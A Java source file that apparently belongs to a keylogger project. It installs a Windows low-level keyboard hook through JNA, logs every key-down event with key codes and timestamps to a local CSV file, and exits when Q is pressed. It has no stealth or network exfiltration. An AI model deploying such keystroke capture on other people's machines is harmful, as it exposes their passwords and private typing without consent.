package uk.co.baconi.keylogger.hooks;

import com.sun.jna.Pointer;
import com.sun.jna.platform.win32.User32;
import com.sun.jna.platform.win32.WinDef;
import com.sun.jna.platform.win32.WinDef.LRESULT;
import com.sun.jna.platform.win32.WinDef.WPARAM;
import com.sun.jna.platform.win32.WinUser;
import com.sun.jna.platform.win32.WinUser.KBDLLHOOKSTRUCT;
import com.sun.jna.platform.win32.WinUser.LowLevelKeyboardProc;
import uk.co.baconi.keylogger.framework.constants.Strings;
import uk.co.baconi.utils.LoggerUtil;
import uk.co.baconi.utils.TimeUtil;

import static uk.co.baconi.utils.StringUtil.concat;

public final class WindowsKeyboardHook implements LowLevelKeyboardProc {
    private static final int Q_KEY_VKCODE = 81;

    private static final String[] LOG_HEADINGS = {"wParam", "vkCode", "flags", "scanCode", "dwExtraInfo", "time",
            "Year-Month-Day", "Hour:Minute:Second:Millisecond"};

    private static final LoggerUtil LOGGER = LoggerUtil.getLogger("KeyHookLog.csv", false, true, LOG_HEADINGS);

    private final WindowsKeyboardHookParent parent;

    public WindowsKeyboardHook(final WindowsKeyboardHookParent parent) {
        this.parent = parent;
    }

    @Override
    public LRESULT callback(final int nCode, final WPARAM wParam, final KBDLLHOOKSTRUCT info) {
        if (nCode >= 0) {
            if (wParam.intValue() == WinUser.WM_KEYDOWN) {
                LOGGER.log(concat(wParam, Strings.COMMA, info.vkCode, Strings.COMMA, info.flags, Strings.COMMA, info.scanCode, Strings.COMMA,
                        info.dwExtraInfo, Strings.COMMA, info.time, Strings.COMMA, TimeUtil.getCurrentDateTime()));

                if (info.vkCode == Q_KEY_VKCODE) {
                    parent.quit();
                }
            }
        }
        return User32.INSTANCE.CallNextHookEx(parent.getHHOOK(), nCode, wParam, new WinDef.LPARAM(Pointer.nativeValue(info.getPointer())));
    }
}
